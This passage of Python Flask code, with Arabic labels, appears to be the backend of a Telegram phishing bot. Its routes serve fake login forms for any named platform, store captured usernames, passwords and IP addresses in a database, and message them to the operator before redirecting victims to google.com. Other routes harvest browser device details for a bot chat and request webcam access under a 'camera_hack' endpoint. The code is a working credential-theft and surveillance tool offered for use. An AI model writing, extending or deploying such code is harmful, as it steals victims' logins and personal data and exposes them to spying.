    return render_template_string("""
    <html><body><h1>جمع معلومات الجهاز</h1><script>
    fetch('/collect_data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token:'%s', data:{userAgent:navigator.userAgent, platform:navigator.platform}})})
    .then(()=>document.body.innerHTML='<h2>تم الإرسال</h2>');
    </script></body></html>
    """ % token)

@app.route('/camera_hack')
def camera_hack():
    return "<h1>كاميرا</h1><script>navigator.mediaDevices.getUserMedia({video:true})</script>"

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    return f"<h1>صفحة تصيد {platform}</h1><form method='POST' action='/phishing_capture'><input name='username'><input name='password' type='password'><button>تسجيل</button></form>"

@app.route('/collect_data', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Invalid'}), 400
        token = data.get('token')
        chat_id = get_chat_id_by_token(token)
        if not chat_id:
            return jsonify({'error': 'Invalid token'}), 400
        info = data.get('data', {})
        msg = "📱 معلومات:\n" + "\n".join([f"{k}: {v}" for k, v in info.items()])
        safe_send(chat_id, msg)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/phishing_capture', methods=['POST'])
def phishing_capture():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    platform = request.form.get('platform', 'unknown')
    ip = request.remote_addr
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
              ('', platform, username, password, ip, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    notify_admin(f"تصيد: {platform} | {username} | {password} | IP: {ip}")
    return "<h1>تم التسجيل</h1><script>setTimeout(()=>window.location='https://google.com',2000)</script>"

@app.route('/health')
def health():
    return jsonify({'status': 'ok'})

@app.route('/')
def index():
    return jsonify({'status': 'running'})

# ===================== مراقبة البوت =====================
def keep_alive():
    while True:
        try:
            requests.get(f"http://localhost:{PORT}/health", timeout=5)
        except:
            pass
        time.sleep(60)

def bot_ping():
    while True:
        try:
            bot.get_me()
        except:
            pass
        time.sleep(300)

def start_bot():
    while True:
        try:
            bot.remove_webhook()
            time.sleep(1)
            bot.polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

# ===================== التشغيل =====================
if __name__ == '__main__':
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=bot_ping, daemon=True).start()
    threading.Thread(target=start_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
